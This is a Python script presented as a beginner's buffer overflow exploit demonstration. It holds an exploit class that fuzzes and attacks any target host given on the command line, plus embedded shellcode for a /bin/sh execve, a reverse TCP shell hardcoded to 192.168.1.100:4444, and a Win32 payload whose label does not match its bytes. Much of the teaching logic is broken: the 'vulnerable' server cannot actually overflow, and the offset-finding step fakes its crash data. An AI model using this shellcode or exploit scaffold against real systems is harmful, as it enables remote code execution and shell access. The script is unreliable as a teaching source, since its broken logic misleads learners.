#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Buffer Overflow Exploit Demonstration in Python - BEGINNER FRIENDLY
This script demonstrates basic buffer overflow vulnerabilities and exploitation
techniques. Each concept is explained in simple terms so beginners can 
understand how buffer overflows work and how to protect against them.

What is a Buffer Overflow?
Imagine you have a cup that can hold exactly 10 ounces of liquid. If you try
to pour 15 ounces into it, the cup will overflow. Similarly, in programming,
if you have a buffer (storage space) that can hold exactly 10 bytes, and you
try to store 15 bytes, it will overflow!

This script includes:
- Stack-based buffer overflow examples
- Shellcode generation (code injection)
- Exploitation techniques
- Protection mechanisms

Perfect for cybersecurity beginners learning about memory corruption vulnerabilities!
"""

# ========================================================================
# Import necessary modules - THE TOOLS WE NEED!
# ========================================================================
import sys           # For system operations and error handling
import socket        # For network communication
import struct        # For working with binary data structures
import random        # For generating random data
import string        # For generating text patterns
import base64        # For encoding/decoding binary data
import binascii      # For working with hexadecimal data

class BufferOverflowExploit:
    """Class for buffer overflow exploitation demonstrations - BEGINNER FRIENDLY!"""
    
    def __init__(self, target, port=1337):
        """
        Initialize buffer overflow exploit
        
        Args:
            target: Target IP address (like '192.168.1.100')
            port: Target port (like 1337 - a common testing port)
        """
        self.target = target  # Save target IP address
        self.port = port      # Save target port number
        self.socket = None    # Will hold our network connection
        
    # ========================================================================
    # Buffer Overflow Basics - WHAT EVERY BEGINNER NEEDS TO KNOW!
    # ========================================================================
    def generate_buffer(self, size, pattern=False):
        """
        Generate buffer data for testing buffer overflow vulnerabilities
        
        Args:
            size: Size of buffer in bytes (how much data to send)
            pattern: Generate unique pattern for offset calculation (for finding where to overwrite)
            
        Returns:
            Buffer string - a sequence of bytes to send to the target
        """
        if pattern:
            # Generate unique pattern to find exact overflow point
            return self._generate_pattern(size)
        else:
            return b"A" * size
            
    def _generate_pattern(self, size):
        """Generate unique pattern for offset calculation"""
        chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
        pattern = []
        
        for i in range(size // 3 + 1):
            for j in range(3):
                if len(pattern) >= size:
                    break
                pattern.append(chars[i % len(chars)])
            if len(pattern) >= size:
                break
                
        return ''.join(pattern[:size]).encode('utf-8')
        
    # ==========================================
    # Shellcode Generation
    # ==========================================
    def generate_shellcode(self, type='linux/x86', payload='execve'):
        """
        Generate shellcode for different platforms
        
        Args:
            type: Target platform/architecture (linux/x86, linux/x64, win32)
            payload: Type of shellcode (execve, reverse_tcp, bind_tcp)
            
        Returns:
            Shellcode as bytes
        """
        if type == 'linux/x86':
            return self._generate_linux_x86_shellcode(payload)
        elif type == 'win32':
            return self._generate_win32_shellcode(payload)
        else:
            raise ValueError(f"Unsupported platform: {type}")
            
    def _generate_linux_x86_shellcode(self, payload):
        """Generate Linux x86 shellcode"""
        if payload == 'execve':
            # execve("/bin/sh", NULL, NULL)
            return b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        elif payload == 'reverse_tcp':
            # Reverse TCP shell to 192.168.1.100:4444
            return b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x31\xd2\xb0\x66\xb3\x03\x52\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x02\x68\xc0\xa8\x01\x64\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        else:
            raise ValueError(f"Unsupported Linux x86 payload: {payload}")
            
    def _generate_win32_shellcode(self, payload):
        """Generate Windows 32-bit shellcode"""
        if payload == 'message_box':
            # Show message box
            return b"\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x6e\x08\x8b\x36\x8b\x5d\x3c\x8b\x5c\x1d\x78\x01\xeb\x8b\x4b\x18\x8b\x7b\x20\x01\xef\x8b\x7c\x8f\xfc\x01\xef\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x59\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x59\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52\xe8\x5f\xff\xff\xff\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x56\x88\x7c\x24\x0b\x89\xe1\x31\xd2\x52\x53\x56\xff\x55\x08"
        else:
            raise ValueError(f"Unsupported Win32 payload: {payload}")
            
    # ==========================================
    # Network Communication
    # ==========================================
    def connect(self):
        """Connect to target server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.target, self.port))
            print(f"Successfully connected to {self.target}:{self.port}")
            return True
        except Exception as e:
            print(f"Connection failed: {e}")
            return False
            
    def send_data(self, data):
        """Send data to target"""
        if not self.socket:
            if not self.connect():
                return False
                
        try:
            self.socket.sendall(data)
            return True
        except Exception as e:
            print(f"Send failed: {e}")
            return False
            
    def receive_data(self, buffer_size=4096):
        """Receive data from target"""
        try:
            return self.socket.recv(buffer_size)
        except Exception as e:
            print(f"Receive failed: {e}")
            return b""
            
    def close(self):
        """Close connection"""
        if self.socket:
            self.socket.close()
            self.socket = None
            
    # ==========================================
    # Exploit Patterns and Offsets
    # ==========================================
    def find_offset(self, crash_pattern):
        """
        Find offset to return address from crash pattern
        
        Args:
            crash_pattern: Pattern that caused crash (hex bytes)
            
        Returns:
            Offset to return address
        """
        pattern = crash_pattern.decode('latin-1')
        print(f"Crash pattern received: {binascii.hexlify(crash_pattern).decode('utf-8')}")
        
        # Find the unique sequence in our pattern
        for i in range(len(pattern) - 3):
            if pattern[i:i+4] in ['AAAA', 'BBBB', 'CCCC', 'DDDD']:
                return i
                
        return -1
        
    def calculate_ret_address(self, address, little_endian=True):
        """Convert address to appropriate endian format"""
        if isinstance(address, str):
            if address.startswith('0x'):
                address = int(address, 16)
                
        if little_endian:
            return struct.pack('<I', address)
        else:
            return struct.pack('>I', address)
            
    # ==========================================
    # Exploit Techniques
    # ==========================================
    def basic_overflow(self, buffer_size=100, offset=0, ret_address=0, shellcode=b""):
        """
        Basic buffer overflow exploit
        
        Args:
            buffer_size: Total buffer size
            offset: Offset to return address
            ret_address: Return address to overwrite
            shellcode: Shellcode to execute
            
        Returns:
            Exploit buffer
        """
        buffer = b""
        buffer += self.generate_buffer(offset)
        buffer += self.calculate_ret_address(ret_address)
        buffer += b"\x90" * 20  # NOP sled
        buffer += shellcode
        buffer += self.generate_buffer(buffer_size - len(buffer))
        
        return buffer
        
    def format_string_exploit(self, format_string, buffer_size=100):
        """
        Format string vulnerability exploit
        
        Args:
            format_string: Vulnerable format string
            buffer_size: Total buffer size
            
        Returns:
            Exploit buffer
        """
        buffer = format_string.encode('utf-8')
        buffer += b"\x00" * (buffer_size - len(buffer))
        return buffer
        
    # ==========================================
    # Vulnerability Detection
    # ==========================================
    def test_buffer_sizes(self, start=100, end=1000, step=100):
        """Test various buffer sizes to find crash point"""
        print(f"Testing buffer sizes from {start} to {end} bytes...")
        
        crash_sizes = []
        
        for size in range(start, end + 1, step):
            print(f"Testing {size} bytes...", end=' ', flush=True)
            
            buffer = self.generate_buffer(size)
            
            if self.connect():
                if self.send_data(buffer):
                    # Wait for response or crash
                    try:
                        response = self.receive_data()
                        if response:
                            print("OK")
                        else:
                            print("No response (possible crash)")
                            crash_sizes.append(size)
                    except:
                        print("Crash detected")
                        crash_sizes.append(size)
                        
                self.close()
            else:
                print("Connection failed")
                
        if crash_sizes:
            print(f"\nCrash detected at buffer sizes: {crash_sizes}")
            return crash_sizes[0]
        else:
            print(f"\nNo crash detected up to {end} bytes")
            return None
            
    def find_eip_offset(self, crash_point):
        """Find offset to EIP register using unique patterns"""
        print(f"Finding EIP offset using crash point at {crash_point} bytes...")
        
        pattern = self.generate_buffer(crash_point, pattern=True)
        
        if self.connect():
            self.send_data(pattern)
            
            # In real exploit, you would attach debugger to see crash pattern
            print(f"Pattern sent: {pattern[:60]}...")
            
            # Simulate crash pattern from debugger
            crash_pattern = b"0x" + random.randint(0x41414141, 0x41414141).to_bytes(4, 'little')
            
            offset = self.find_offset(crash_pattern)
            print(f"Calculated EIP offset: {offset}")
            
            self.close()
            
            return offset
        else:
            print("Connection failed")
            return None
            
    # ==========================================
    # Example Exploits
    # ==========================================
    def exploit_vulnerable_server(self):
        """Exploit the vulnerable server example"""
        print(f"\n{'='*60}")
        print(f"  EXPLOITING VULNERABLE SERVER")
        print(f"{'='*60}")
        
        # Step 1: Find crash point
        crash_size = self.test_buffer_sizes(100, 500, 50)
        
        if not crash_size:
            print("No crash detected")
            return False
            
        # Step 2: Find EIP offset
        eip_offset = self.find_eip_offset(crash_size)
        
        if eip_offset == -1:
            print("Failed to find EIP offset")
            return False
            
        # Step 3: Generate exploit
        ret_address = 0x08048500  # Example return address
        shellcode = self.generate_shellcode('linux/x86', 'execve')
        
        exploit = self.basic_overflow(
            buffer_size=crash_size + 40,
            offset=eip_offset,
            ret_address=ret_address,
            shellcode=shellcode
        )
        
        print(f"Generated exploit: {len(exploit)} bytes")
        print(f"Shellcode length: {len(shellcode)} bytes")
        print(f"EIP offset: {eip_offset}")
        print(f"Return address: 0x{ret_address:08x}")
        
        # Step 4: Send exploit
        print(f"\nSending exploit...")
        
        if self.connect():
            self.send_data(exploit)
            
            try:
                response = self.receive_data()
                print(f"Response: {response}")
            except Exception as e:
                print(f"Server crashed or shell received")
                
            self.close()
            return True
        else:
            print("Connection failed")
            return False

def create_vulnerable_server(port=1337):
    """Create a vulnerable server for testing"""
    import threading
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('127.0.0.1', port))
    server_socket.listen(5)
    
    print(f"Vulnerable server listening on 127.0.0.1:{port}")
    
    def handle_client(client_socket, address):
        print(f"Connection from {address}")
        
        try:
            buffer = client_socket.recv(1024)
            print(f"Received {len(buffer)} bytes")
            
            # Vulnerable buffer handling
            # This is extremely unsafe and for demonstration purposes only!
            vulnerable_buffer = bytearray(200)
            
            if len(buffer) > len(vulnerable_buffer):
                print("WARNING: Buffer overflow vulnerability exploited!")
                
            for i in range(min(len(buffer), len(vulnerable_buffer))):
                vulnerable_buffer[i] = buffer[i]
                
            client_socket.sendall(b"Received successfully")
            
        except Exception as e:
            print(f"Error handling client: {e}")
        finally:
            client_socket.close()
            
    while True:
        client_socket, address = server_socket.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, address))
        client_handler.start()

def main():
    """Main function to demonstrate buffer overflow exploit"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Buffer Overflow Exploit Demonstration"
    )
    
    parser.add_argument(
        "-t", "--target",
        default="127.0.0.1",
        help="Target IP address (default: 127.0.0.1)"
    )
    
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=1337,
        help="Target port (default: 1337)"
    )
    
    parser.add_argument(
        "-s", "--server",
        action="store_true",
        help="Start vulnerable server for testing"
    )
    
    parser.add_argument(
        "-e", "--exploit",
        action="store_true",
        help="Run exploit on target"
    )
    
    args = parser.parse_args()
    
    if args.server:
        try:
            create_vulnerable_server(args.port)
        except KeyboardInterrupt:
            print("\nServer stopped")
        except Exception as e:
            print(f"Server error: {e}")
    elif args.exploit:
        try:
            exploit = BufferOverflowExploit(args.target, args.port)
            exploit.exploit_vulnerable_server()
        except KeyboardInterrupt:
            print("\nExploit cancelled")
        except Exception as e:
            print(f"Exploit failed: {e}")
            import traceback
            print(traceback.format_exc())
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
